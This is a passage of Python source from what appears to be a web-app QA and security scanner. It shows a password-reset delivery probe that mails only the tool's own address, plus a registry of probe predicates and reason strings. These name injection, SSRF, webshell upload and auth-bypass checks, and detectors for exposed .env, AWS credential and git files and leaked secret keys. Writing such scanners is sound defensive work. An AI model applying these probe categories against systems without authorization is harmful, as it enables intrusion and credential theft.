    """Discovered JSON endpoints that REQUEST a password reset (email in, no token/password) -- the SPA analog of
    a forgot-password form. Excludes the completion endpoint (consumes a token, mails nothing) by field shape."""
    out = []
    for e in endpoints or []:
        if (e.method or "get").lower() not in ("post", "put"):
            continue
        path = (e.raw_path or e.path or "").lower()
        if not _RESET_REQUEST_PATH.search(path):
            continue
        fields = list(e.body_fields or [])
        has_email = any(_RESET_FIELD_EMAIL.search(f) for f in fields)
        has_secret = any(_RESET_FIELD_SECRET.search(f) for f in fields)
        if has_secret:
            continue                                          # a token/password body -> the completion route, not the request
        if has_email or (not fields and ("forgot" in path or "recover" in path)):
            out.append(e)
    return out


def _trigger_reset_json(client, base, endpoint, email) -> bool:
    """POST a discovered JSON forgot/recover endpoint with OUR controlled address so the app mails a reset link.
    Uses the endpoint's own body_fields (the email-ish field <- our address, others benign), else a couple of
    common shapes. True when accepted (<400). Reset endpoints intentionally 200 regardless (enumeration-safe), so
    'accepted' just means the request took; the EMAIL's arrival is what the probe judges. Address is ALWAYS ours."""
    if endpoint.body_fields:
        bodies = [{f: (email if _RESET_FIELD_EMAIL.search(f) else "hl_reset") for f in endpoint.body_fields}]
    else:
        bodies = [{"email": email}, {"username": email}]
    for body in bodies:
        try:
            if client.post(endpoint.path, json=body).status_code < 400:
                return True
        except (httpx.HTTPError, httpx.InvalidURL):
            continue
    return False


def _run_reset_flow(ctx, suffix=""):
    """Request a password reset for an account WE established (our controlled address) and judge whether the
    recovery path works. PRECONDITION: an account with our address must plausibly exist -- else a reset request
    sends nothing (enumeration-silence) and 'no email' would be a false lockout. Two trigger lanes: a
    server-rendered forgot-password form (driven with the account's own client), and Supabase /auth/v1/recover
    when the signup lane created the account at the gateway."""
    _email_register_once(ctx, suffix)                     # ensure an account with our address exists (memoized)
    tag, address = _email_ctx(ctx, suffix)
    base = ctx.base_url
    live = ctx._email_cache.get("_live" + suffix, {})
    acct = live.get("acct")
    lane = live.get("lane", "")
    profile = getattr(ctx, "profile", None)
    # PRECONDITION -- an account with our address plausibly EXISTS via ANY register lane (else a reset sends
    # nothing -> false lockout). Broadened past httpx+Supabase: an httpx session/announce, a Supabase signup, a
    # captured session snapshot (email-verified / browser / Firebase), or an immediate-session lane all mean the
    # signup with our address took. (Was httpx+baas only, which N/A'd the ~10%+ where the browser/Firebase/
    # immediate lanes DID establish a session.)
    httpx_account = acct is not None and (auth._has_session(acct) or
                    email_verify.announces_pending_email(_resp_text(acct.register_response)))
    account_exists = (httpx_account
                      or lane.startswith("baas")
                      or bool(ctx._email_cache.get("account_session" + suffix))
                      or lane in ("browser_session", "firebase_session", "baas_session"))
    forgot = auth._forgot_form(profile.forms) if profile is not None else None
    if not account_exists:
        return email_verify.ResetResult(
            attempted=False, na_reason="no established account with a controlled address to request a reset for")
    # the forgot-password endpoint takes an EMAIL, not the account's session, so a fresh client works when the
    # session came from the browser/Firebase lane (no httpx acct); reuse the account's client when we have one.
    own_client = acct.client if acct is not None else None
    forgot_client = own_client or httpx.Client(base_url=base, timeout=15.0, follow_redirects=True)
    used: dict = {}

    def trigger(addr):
        if forgot is not None and auth._trigger_reset_httpx(forgot_client, base, forgot, addr):
            used["lane"] = "form"
            return True
        gw = _baas_gateway(ctx)                              # Supabase recover, gated on the gateway existing
        if gw is not None and baas.recover(gw[0], gw[1], addr):
            used["lane"] = "baas"
            return True
        for e in _json_reset_endpoints(profile.endpoints if profile is not None else []):
            if _trigger_reset_json(forgot_client, base, e, addr):   # SPA JSON forgot/recover endpoint
                used["lane"] = "json"
                used["endpoint"] = e.path
                return True
        return False

    def follow(msg):
        # only the app-hosted reset link (form lane) is a GET-able page; a Supabase recover link is a gateway
        # endpoint a bare GET can't judge, so leave link_alive None there (delivery is still judged).
        if used.get("lane") not in ("form", "json"):        # app-hosted reset link is GET-able (form + SPA-JSON lanes)
            return None
        for link in [ln for ln in msg.links if _same_app_link(ln, base)][:3]:
            try:
                r = forgot_client.get(link)
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            return 200 <= r.status_code < 400
        return None

    try:
        return email_verify.reset_email_flow(ctx.email, tag, trigger, follow, timeout=_EMAIL_ANNOUNCED_TIMEOUT)
    finally:
        if own_client is None:                              # close the fresh client we made (never the account's)
            with contextlib.suppress(Exception):
                forgot_client.close()


def reset_email_unreliable(ctx, probe) -> bool | None:
    """qa-reset-001: an account we established cannot be recovered -- the password-reset email never arrives (the
    user is locked out of recovery), or it arrives but its link is dead. SCORES per the qa-reset-001 severity
    block (no reset email in 60s -> 60; a dead reset link -> 24)."""
    res = _reset_result(ctx)
    if not res.attempted or not res.reset_available:
        ctx.evidence["na_reason"] = res.na_reason or "no testable password-reset flow"
        return None
    ctx.evidence["reset_available"] = True
    if res.message is not None:
        ctx.evidence["subject"] = (res.message.subject or "")[:120]
    if not res.email_arrived:
        ctx.evidence["no_reset_email_60s"] = True         # escalator -> top rung (locked out of recovery)
        ctx.evidence["detail"] = res.detail
        return True
    if res.link_alive is False:
        ctx.evidence["reset_link_dead"] = True            # escalator -> mid rung (broken reset page)
        ctx.evidence["detail"] = res.detail
        return True
    return False    # reset email arrived and (link alive, or not GET-followable) -> recovery works


PREDICATES = {
    "lighthouse_audit": lighthouse_audit,
    "email_never_arrives": email_never_arrives,
    "email_verification_inert": email_verification_inert,
    "reset_email_unreliable": reset_email_unreliable,
    "international_input_breaks": international_input_breaks,
    "lighthouse_perf_score": lighthouse_perf_score,
    "sqli_auth_bypass": sqli_auth_bypass,
    "api_sqli": api_sqli,
    "xss_injectable": xss_injectable,
    "command_injection": command_injection,
    "ssti_injectable": ssti_injectable,
    "ssrf": ssrf,
    "xxe": xxe,
    "path_traversal": path_traversal,
    "file_upload": file_upload,
    "upload_stored_xss": upload_stored_xss,
    "stored_xss_api": stored_xss_api,
    "back_nav_broken": back_nav_broken,
    "dead_bundle_chunk": dead_bundle_chunk,
    "development_build_served": development_build_served,
    "deep_link_shell": deep_link_shell,
    "no_error_state": no_error_state,
    "weak_session_id": weak_session_id,
    "api_bola": api_bola,
    "api_bola_collection": api_bola_collection,
    "exposed_sensitive_file": exposed_sensitive_file,
    "middleware_auth_bypass": middleware_auth_bypass,
    "data_integrity_roundtrip": data_integrity_roundtrip,
    "data_integrity_list_roundtrip": data_integrity_list_roundtrip,
    "race_resource_ids_api": race_resource_ids_api,
    "stale_ui_after_create": stale_ui_after_create,
    "content_type_mismatch": content_type_mismatch,
    "debug_mode_enabled": debug_mode_enabled,
    "leaks_error_detail": leaks_error_detail,
    "exposed_backend_readable": exposed_backend_readable,
    "anon_bulk_data_exposed": anon_bulk_data_exposed,
    "filter_injection": filter_injection,
    "backend_schema_disclosed": backend_schema_disclosed,
    "authenticated_backend_readable": authenticated_backend_readable,
    "bundle_leaks_secret": bundle_leaks_secret,
    "unreachable_backend_reference": unreachable_backend_reference,
    "internal_address_disclosed": internal_address_disclosed,
    "oauth_redirect_localhost": oauth_redirect_localhost,
    "no_tls_origin": no_tls_origin,
    "vulnerable_dependency": vulnerable_dependency,
    "source_map_exposed": source_map_exposed,
    "session_cookie_missing_flag": session_cookie_missing_flag,
    "session_token_in_local_storage": session_token_in_local_storage,
    "login_no_rate_limit": login_no_rate_limit,
    "csrf_missing": csrf_missing,
    "idor_horizontal": idor_horizontal,
    "idor_user_record": idor_user_record,
    "bola_managed_backend": bola_managed_backend,
    "dom_xss": dom_xss,
    "race_resource_ids": race_resource_ids,
    "load_resilience": load_resilience,
    "crash_resistance": crash_resistance,
    "declared_constraint_unenforced": declared_constraint_unenforced,
    "http_soft_404": http_soft_404,
    "a11y_hard_fails": a11y_hard_fails,
    "broken_links": broken_links,
    "redirect_loop": redirect_loop,
    "mixed_content": mixed_content,
    "subresource_integrity_missing": subresource_integrity_missing,
    "seo_meta_missing": seo_meta_missing,
    "http_conformance": http_conformance,
    "console_errors_present": console_errors_present,
    "a11y_violations_present": a11y_violations_present,
    "dead_controls_present": dead_controls_present,
    "open_redirect": open_redirect,
    "host_header_injection": host_header_injection,
    "http_response_splitting": http_response_splitting,
    "decompression_bomb": decompression_bomb,
}


# Human-readable "why it fired" reasons for verbose / --failed output, derived from the probe's check.
_MATCHER_REASONS = {
    "response_contains": "reflected the probe payload unescaped",
    "response_missing_header": "missing header: {arg}",
    "response_missing_clickjacking_defense": "no clickjacking defense (X-Frame-Options / CSP frame-ancestors)",
    "response_csp_weak": "the Content-Security-Policy is present but toothless against XSS ('unsafe-inline' / wildcard script source with no nonce/hash) -> a false sense of safety",
    "response_cors_misconfigured": "reflects an arbitrary Origin with credentials (CORS)",
    "response_server_error": "returned a 5xx server error",
    "response_has_header": "leaks the {arg} header (stack / version disclosure)",
    "response_is_aws_credentials": "served an AWS credentials file at the webroot",
    "response_leaks_credentials": "returned password/credential material in a response body",
    "response_leaks_secret": "leaked a secret (private key / cloud or API token)",
    "response_is_dotenv": "served a .env secrets file",
    "response_is_git_config": "served .git/config (source repo exposed)",
    "response_is_git_head": "served .git/HEAD (source repo exposed)",
}

_PREDICATE_REASONS = {
    "lighthouse_audit": "a Lighthouse performance audit is below its passing threshold",
    "email_never_arrives": "signup is email-verification-gated but no confirmation email arrives -> the user is locked out",
    "email_verification_inert": "the confirmation email arrives but acting on its link establishes no session -> verification is broken",
    "reset_email_unreliable": "an account we established cannot be recovered -> the password-reset email never arrives, or its link is dead",
    "international_input_breaks": "the app corrupts (mojibake) or 500s on international / multibyte input (emoji / CJK / Arabic / astral)",
    "lighthouse_perf_score": "the overall Lighthouse performance score is below the green line (slop = its shortfall under 90)",
    "sqli_auth_bypass": "login bypassed by a SQL-injection payload",
    "api_sqli": "a parameter is SQL-injectable (error / boolean / UNION / time-based)",
    "xss_injectable": "an input reflects unescaped into HTML (XSS: script / img / svg / attribute / stored)",
    "command_injection": "an input reaches an OS shell (injected command executed: separator / substitution / time-based)",
    "ssti_injectable": "an input is evaluated by a server-side template engine (SSTI -> code execution)",
    "ssrf": "the server fetched an attacker-supplied URL (server-side request forgery)",
    "xxe": "the XML parser resolved an external entity to an attacker URL (XXE)",
    "path_traversal": "a filename param served a file outside the web root (path traversal / local file inclusion)",
    "file_upload": "an uploaded webshell was accepted and executed server-side (insecure file upload -> RCE)",
    "upload_stored_xss": "an uploaded HTML/SVG file is served inline with an executable content-type (stored XSS via file upload)",
    "stored_xss_api": "a value stored via the JSON API executed unescaped when the page rendered it (stored XSS)",
    "exposed_sensitive_file": "a sensitive file is served to anonymous visitors (terraform state / SQL dump / docker or npm credentials / private key / a config carrying a real secret)",
    "middleware_auth_bypass": "a protected route is reachable with no credentials via the Next.js x-middleware-subrequest header (auth bypass, CVE-2025-29927)",
    "back_nav_broken": "the browser back button did not return to the prior in-app view (broken SPA history handling)",
    "dead_bundle_chunk": "the served HTML references a JS bundle that doesn't resolve — the app can't render (stale/dead chunk)",
    "development_build_served": "a development build was deployed — the served page requests an HMR client, which no production build can emit",
    "deep_link_shell": "a client-side route loaded directly renders only the app shell/fallback, not its content (broken deep link)",
    "no_error_state": "a save/create action failed but the app showed no error — silent data loss (the UI told the user nothing)",
    "weak_session_id": "session identifiers are weak/predictable (short / numeric / sequential)",
    "api_bola": "one account's object (and its secret) was readable by another account (broken object-level auth)",
    "api_bola_collection": "an auth-gated list endpoint returns every user's objects, not just the caller's (broken object-level auth at the collection)",
    "data_integrity_roundtrip": "a created object could not be read back afterward (non-durable write / silent data loss)",
    "data_integrity_list_roundtrip": "a created object was absent from its own collection right after a successful create (silent data loss)",
    "race_resource_ids_api": "concurrent API creates were assigned duplicate ids (non-atomic id allocation — a race)",
    "stale_ui_after_create": "a saved item did not appear until a manual page refresh (durable write, stale UI — the app looked like it lost the data)",
    "content_type_mismatch": "a response's body contradicts its declared Content-Type (e.g. JSON served as text/html -> client breakage / reflected-JSON XSS)",
    "debug_mode_enabled": "framework debug mode is on in production (interactive debugger / DEBUG page -> source, settings, env and an RCE console exposed)",
    "leaks_error_detail": "an induced server error leaked a stack trace or a database error to the user (info disclosure + a broken error path)",
    "exposed_backend_readable": "the app's managed backend (Supabase/Firebase) is world-readable with its own public key -> the whole database is exposed (missing row-level security)",
    "filter_injection": "a query parameter reaches the data store's FILTER expression (PostgREST/NoSQL filter injection: the caller controls what the query matches)",
    "anon_bulk_data_exposed": "an anonymous request returned bulk records carrying personal or financial data "
                              "(no authorization on a data-export route)",
    "backend_schema_disclosed": "the managed backend discloses its schema to anyone (table list at the API "
                               "root, or database errors naming columns)",
    "authenticated_backend_readable": "any logged-in user reads every other user's data -> broken authenticated-tier RLS/Rules (the IDOR equivalent on a BaaS app; missing per-user row filtering)",
    "bundle_leaks_secret": "a hardcoded SECRET key (Stripe sk_ / OpenAI / AWS secret / GitHub PAT / private key) is shipped in the client JS bundle -> account/DB takeover (public anon/publishable keys are not flagged)",
    "unreachable_backend_reference": "the shipped client bundle calls a backend no visitor can reach (localhost / a private IP / an unset env var) -> the app renders but its data layer is dead in production",
    "internal_address_disclosed": "the client bundle hardcodes an internal-only address (a private/link-local IP or an *.internal/.corp hostname) -> leaks infrastructure topology to any source-viewer (recon); loopback/localhost is not flagged",
    "oauth_redirect_localhost": "the OAuth sign-in sets redirect_uri to localhost / a private IP / an unset env var -> after authenticating, the provider bounces the user to a host that doesn't exist in production, so login is dead for every visitor",
    "no_tls_origin": "the public origin is served over plain http:// with no upgrade to https -> every visitor's credentials and session cookies cross the network in the clear",
    "vulnerable_dependency": "the app ships a client library with a KNOWN CVE (retire.js-style: jQuery / AngularJS / Bootstrap / Axios / Moment / Handlebars / DOMPurify) -> supply-chain risk the team chose; upgrade per the finding",
    "source_map_exposed": "a production JS bundle serves its .map -> the original source is reconstructable (business logic, hidden endpoints, and secrets a minified scan misses)",
    "session_cookie_missing_flag": "session cookie missing the {flag} flag",
    "session_token_in_local_storage": "session token persisted in localStorage (readable by any XSS on the origin — unlike an HttpOnly cookie)",
    "csrf_missing": "state-changing POST accepted cross-site with no token / SameSite",
    "idor_horizontal": "another account's object was readable by id (broken access control)",
    "idor_user_record": "one account's private user record was readable by another account by id (horizontal IDOR / broken object-level auth)",
    "bola_managed_backend": "the managed backend (Supabase) let one account read another's private row -> per-user Row-Level Security is broken (the app's own RLS config)",
    "dom_xss": "an injected payload executed in the DOM",
    "race_resource_ids": "concurrent creates collided on one id (non-atomic allocation)",
    "load_resilience": "endpoint 5xx'd under a concurrent burst",
    "crash_resistance": "malformed input caused an unhandled 5xx instead of a graceful 4xx",
    "declared_constraint_unenforced": "the server accepted a value violating the app's own declared field constraint (type=email/number/... -> client-only validation)",
    "http_soft_404": "a nonexistent static asset returned 2xx instead of 404 (soft-404 -> pollutes caches / crawlers / monitoring)",
    "a11y_hard_fails": "accessibility hard-fail (missing lang / alt / form-control name / page title, or text below the 3:1 contrast floor)",
    "broken_links": "an internal link leads to a 4xx dead end (broken navigation)",
    "redirect_loop": "the homepage or a route it links to redirects endlessly (ERR_TOO_MANY_REDIRECTS) -- the page never loads for any visitor",
    "mixed_content": "an https page loads a subresource over plain http:// (mixed content -> MITM-tamperable; active mixed content is browser-blocked, breaking the page)",
    "subresource_integrity_missing": "a cross-origin script/stylesheet loads without a Subresource Integrity hash -> a compromised or hijacked CDN can run arbitrary code in the app's origin (supply-chain risk)",
    "seo_meta_missing": "missing a best-practice meta tag (viewport -> unusable on mobile, or description -> no search snippet)",
    "http_conformance": "HTML response served with no declared charset (browser must guess the encoding -> mojibake / UTF-7 XSS surface)",
    "login_no_rate_limit": "repeated wrong-password logins were never throttled",
    "console_errors_present": "the app's own code fails on load (an uncaught JS error, a CSP that blocks its own resource, or a React hydration mismatch)",
    "dead_controls_present": "clickable controls wired to nothing (no effect on click) — non-functional UI",
    "a11y_violations_present": "accessibility violations (missing alt / form label / lang / control name)",
    "open_redirect": "a user-controlled parameter redirects to an arbitrary external host",
    "host_header_injection": "a client-controlled Host / X-Forwarded-Host header reflects into a URL / redirect (cache + password-reset poisoning)",
    "http_response_splitting": "CRLF injected into a parameter reflects into a response header (header injection / response splitting)",
    "decompression_bomb": "decompresses gzip request bodies with no size cap (a zip bomb would exhaust memory -> DoS)",
}


def describe(probe) -> str:
    """Short human reason a probe fires (for verbose / --failed), derived from its predicate or
    slop_if conditions — not live evidence, but enough to know what failed and act on it."""
    p = probe.probe
    if "predicate" in p:
        return _PREDICATE_REASONS.get(p["predicate"], p["predicate"]).format(flag=p.get("flag", ""))
    parts = []
    for cond in probe.slop_if:
        if isinstance(cond, str):
            parts.append(_MATCHER_REASONS.get(cond, cond))
        else:
            ((name, arg),) = cond.items()
            parts.append(_MATCHER_REASONS.get(name, name).format(arg=arg))
    return "; ".join(parts)
